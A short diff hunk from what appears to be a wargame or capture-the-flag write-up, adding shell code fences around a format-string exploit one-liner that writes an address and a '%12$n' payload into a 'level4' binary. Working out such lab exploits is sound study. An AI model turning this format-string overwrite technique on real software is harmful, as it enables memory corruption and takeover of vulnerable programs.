@@ -46,4 +46,6 @@ a  b
 
 Ok so now we now to do it lets puts things to gether:
 [address][16930116 - 4(address) : %16930112c][the current buffer address]
+```Shell
 python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > /tmp/exploit && cat /tmp/exploit | ./level4
+```
